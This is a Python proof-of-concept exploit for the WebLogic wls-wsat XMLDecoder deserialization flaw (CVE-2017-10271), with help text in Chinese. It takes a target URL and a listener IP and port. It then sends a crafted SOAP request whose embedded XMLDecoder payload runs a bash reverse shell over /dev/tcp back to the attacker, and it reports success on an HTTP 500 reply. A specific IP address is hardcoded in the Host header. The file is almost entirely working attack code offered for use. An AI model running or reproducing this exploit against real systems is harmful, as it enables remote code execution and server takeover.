import requests
import argparse
ASCII_ART=r'''
       _                                           
 __  _| | ___   _ _ __   ___      _ __   ___   ___ 
 \ \/ / |/ / | | | '_ \ / _ \    | '_ \ / _ \ / __|
  >  <|   <| |_| | | | | (_) |   | |_) | (_) | (__ 
 /_/\_\_|\_\\__,_|_| |_|\___/____| .__/ \___/ \___|
                           |_____|_|               
'''
def parse_arguments():
    parser = argparse.ArgumentParser(description="Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）")
    parser.add_argument('-t', '--target', type=str, required=True,
                        help="请输入目标(http://example.com/)")
    parser.add_argument('-i', '--ip', type=str, required=True,
                        help="输入你监听机的IP地址")
    parser.add_argument('-p', '--port', type=int, required=True,
                        help="输入你监听的端口")
    return parser.parse_args()
def poc(target,ip,port):
    headers = {
        'Host': '121.41.37.130:7001',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        # 'Content-Length': '631',
        'Content-Type': 'text/xml',
    }

    data = f'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>\r\n<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">\r\n<java version="1.4.0" class="java.beans.XMLDecoder">\r\n<void class="java.lang.ProcessBuilder">\r\n<array class="java.lang.String" length="3">\r\n<void index="0">\r\n<string>/bin/bash</string>\r\n</void>\r\n<void index="1">\r\n<string>-c</string>\r\n</void>\r\n<void index="2">\r\n<string>bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1</string>\r\n</void>\r\n</array>\r\n<void method="start"/></void>\r\n</java>\r\n</work:WorkContext>\r\n</soapenv:Header>\r\n<soapenv:Body/>\r\n</soapenv:Envelope>'

    response = requests.post(f'{target}wls-wsat/CoordinatorPortType', headers=headers, data=data, verify=False)
    return response
if __name__ == "__main__":
    print(ASCII_ART)
    arg=parse_arguments()
    a=poc(arg.target,arg.ip,arg.port)
    if a.status_code == 500:
        print('反弹shell成功')

